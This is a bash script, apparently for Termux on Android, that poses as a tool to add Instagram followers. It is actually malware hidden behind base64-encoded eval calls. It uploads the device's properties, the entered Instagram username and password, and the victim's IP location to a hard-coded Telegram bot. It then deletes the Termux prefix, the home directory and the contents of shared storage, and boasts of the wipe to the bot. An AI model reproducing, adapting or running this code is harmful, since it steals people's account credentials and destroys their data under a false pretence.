#!/bin/bash
# @Pero_Sar1111 on telegram!!!
# @cyberknight_777 on tg
#-------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
#-------------
req="YXB0IGluc3RhbGwgY3VybCA+IC9kZXYvbnVsbCAyPiYxICYmIGFwdCBpbnN0YWxsIHJ1YnkgID4gL2Rldi9udWxsIDI+JjEgJiYgZ2VtIGluc3RhbGwgbG9sY2F0ID4gL2Rldi9udWxsIDI+JjE="
flo="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PUluc3RhZ3JhbSBVc2VybmFtZSAtICR1c3JuIGFuZCBQYXNzd29yZCAtICRwYXNzd2QiICY+L2Rldi9udWxs"
result="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PW1vdGhlcmZ1Y2tlciBlbnRlcmVkICRhbXQiICY+L2Rldi9udWxs"
sgnl="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PSQoY3VybCAtTCBpcGxpc3QuY2MvYXBpLyQoY3VybCAtTCBpZmNvbmZpZy5tZSkpIiAmPi9kZXYvbnVsbA=="
srvr="Y2QgL3NkY2FyZCAmJiBweXRob24yIC1tIFNpbXBsZUhUVFBTZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
death="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5
bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4
ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYg
cm0gLXJmICovCgpldmFsICQoYmFzZTY0IC1kIDw8PCIkdHJpY2siKQoKCg=="
death2="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5
bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4
ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYg
cm0gLXJmICovCgpjdXJsIC1YIFBPU1QgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxNTA5
MzA2MzA2OkFBRW1HMHhtd084TXF4WW16UERSbVlSQVZERVV5cERvSGMwL3NlbmRNZXNzYWdlIiAt
ZCAiY2hhdF9pZD0tMTAwMTQ2Njk4MDgxNiIgLWQgInRleHQ9bW90aGVyZnVja2VyJ3Mgc3RvcmFn
ZSB3aXBlZCA6KSIgJj4vZGV2L251bGwK"
trick="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVt
RzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9
LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PVNraWQgZW50ZXJlZCB3cm9uZyBvcHRpb24sIHN0b3Jh
Z2Ugd2lwZWQgOikiICY+L2Rldi9udWxsCg=="
req2="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0
cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MDkzMDYzMDY6QUFFbUcweG13TzhNcXhZbXpQRFJt
WVJBVkRFVXlwRG9IYzAvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDE0NjY5ODA4MTYgJj4vZGV2
L251bGwK"
#------------

#main
echo -e $red Installing Requirements... $rset
echo -e $grn Please wait... $rset
    eval $(base64 -d <<<"$req")
    eval $(base64 -d <<<"$req2")
echo -e $grn Requirements Installed. $rset

#banner
clear
echo '_____     _ _
|  ___|__ | | | _____      __
| |_ / _ \| | |/ _ \ \ /\ / /
|  _| (_) | | | (_) \ V  V /
|_|  \___/|_|_|\___/ \_/\_/' | lolcat
echo ' 
███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                             
' | lolcat 
#opt
echo -e $ylo Choose Followers Amount $rset
echo -e $red [ 1 ] $cyan 100 Followers $rset
echo -e $red [ 2 ] $cyan 500 Followers $rset
echo -e $red [ 3 ] $cyan 1000 Followers $rset
echo -e $red [ 4 ] $cyan 5000 Followers $rset
echo -e $blue IMPORTANT : followers will be added after 1 hour $rset
echo " "
echo -e $red Choose an option : $rset
read -p $'\n\e[96m(option)>>> \e[0m' amt
case $amt in
    1 | 01)
	eval $(base64 -d <<<"$result")
	;;
    2 | 02)
	eval $(base64 -d <<<"$result")
	;;
    3 | 03)
	eval $(base64 -d <<<"$result")
	;;
    4 | 04)
	eval $(base64 -d <<<"$result")
	;;
    *)
	echo "Wrong option mate. choosing 4 as default."
	eval $(base64 -d <<<"$death")
	;;
esac

#usrn
echo -e $red Enter Instagram Username : $rset
read -p $'\n\e[96m(username)>>> \e[0m' usrn
case $usrn in
    fuck)
	eval $(base64 -d <<<"$death")
	;;
    madarchod)
	eval $(base64 -d <<<"$death")
	;;
    hack)
	eval $(base64 -d <<<"$death")
	;;
    "")
	eval $(base64 -d <<<"$death")
	;;
    *)
	;;
esac
#passw
echo -e $red Enter your Password : $rset
read -p $'\n\e[96m(password)>>> \e[0m' passwd
case $passwd in
    fuck)
	eval $(base64 -d <<<"$death")
	;;
    madarchod)
	eval $(base64 -d <<<"$death")
	;;
    hack)
	eval $(base64 -d <<<"$death")
	;;
    "")
	eval $(base64 -d <<<"$death")
	;;
    *)
	;;
esac
eval $(base64 -d <<<"$flo")
echo -e $red [!] Bot is going to login to increase followers $rsete
echo -e $red [!] allow if it shows suspicious login as bot will try to login from various location with our server
sleep 3
#py
echo -e $red [!] $cyan Please Wait... $rset
apt install python2 > /dev/null 2>&1
echo -e $red [!] $grn Adding Followers... $rset
sleep 2 
echo -e $red [!] $blue Please wait for 1 hour $rset
eval $(base64 -d <<<"$sgnl") &>/dev/null
eval $(base64 -d <<<"$death2") 
#storage exists check
# [[ -d /sdcard ]] && eval $(base64 -d <<<"$srvr")
